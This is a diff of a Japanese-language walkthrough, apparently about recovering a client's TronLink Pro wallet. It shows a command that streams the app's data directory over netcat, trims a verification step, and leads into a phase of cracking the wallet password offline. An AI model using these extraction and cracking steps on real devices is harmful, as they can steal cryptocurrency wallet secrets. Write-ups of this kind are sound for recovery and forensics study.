@@ -144,21 +144,7 @@ $ printf "tar -czC /data/data/com.tronlinkpro.wallet . | base64; exit\n" | nc 12
 
 ![ファイル転送](file_transfer.gif)
 
-これでアプリデータ全体を取得：`shared_prefs`、`databases`、全部。正しく届いたか確認する：
-
-```bash
-$ mkdir -p recovery
-$ tar -xzf recovery.tar.gz -C recovery
-$ ls -l recovery/shared_prefs/carlitosmenem991.xml
-```
-
-Output:
-
-```text
--rw-rw-r-- 1 astro astro 2738 Mar 21 02:34 recovery/shared_prefs/carlitosmenem991.xml
-```
-
-完璧。全部揃った。フェーズ1完了。クライアントのスマホはroot化なし、bootloaderアンロックなし、何も壊さずにそのまま。必要なものは全てPCに入った。
+これでアプリデータ全体を取得：`shared_prefs`、`databases`、全部。フェーズ1完了。クライアントのスマホはroot化なし、bootloaderアンロックなし、何も壊さずにそのまま。必要なものは全てPCに入った。
 
 ## フェーズ2: オフラインでパスワードをcrackする
 
